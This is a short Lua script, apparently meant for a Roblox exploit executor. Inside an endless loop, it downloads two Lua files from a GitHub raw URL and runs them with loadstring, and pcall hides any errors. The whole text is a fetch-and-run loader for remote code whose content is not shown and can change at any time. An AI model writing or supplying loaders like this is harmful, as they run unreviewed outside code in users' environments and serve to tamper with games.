coroutine.resume(coroutine.create(function()
    while wait() do
        local function main()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/RealTheVictor/EZ/main/Emoji.lua'))()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/RealTheVictor/EZ/main/coolkids.lua'))()
        end
        local success, err = pcall(main)
    end
end))
